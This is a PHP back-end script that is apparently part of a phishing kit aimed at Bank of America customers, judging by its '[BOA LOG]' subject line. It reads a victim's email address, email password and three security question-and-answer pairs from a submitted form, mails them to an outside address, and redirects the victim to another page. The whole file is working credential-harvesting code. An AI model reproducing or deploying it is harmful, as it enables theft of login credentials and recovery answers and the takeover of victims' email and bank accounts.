<?php
include'ip.php';
$ip = MDgetIp();
$email=$_POST['email'];
$epassword=$_POST['epassword'];

$que1=$_POST['que1']."\n";
$que2=$_POST['que2']."\n";
$que3=$_POST['que3']."\n";
$ans1=$_POST['ans1']."\n";
$ans2=$_POST['ans2']."\n";
$ans3=$_POST['ans3']."\n";

$message='Email: '.$email.' Email Pass:'.$epassword.'  Question1:'.$que1.' Answer:'.$ans1.'  Question2:'.$qu2.' Answer2:'.$ans2.'  Question3:'.$qu3.' Answer3:'.$ans3;

$to = "rizot@tuta.io";
$subject = "[BOA LOG] ARMCOKE LOGIN";
$headers = "From: Jokercc spammer";
$headers ="MIME-Version: 1.0 \r\n";
$headers ="Content-type: text/html \r\n";
mail($to,$subject,$message,$headers);
$praga=rand();
$praga=md5($praga);

header("location:info.php");

	 
?>
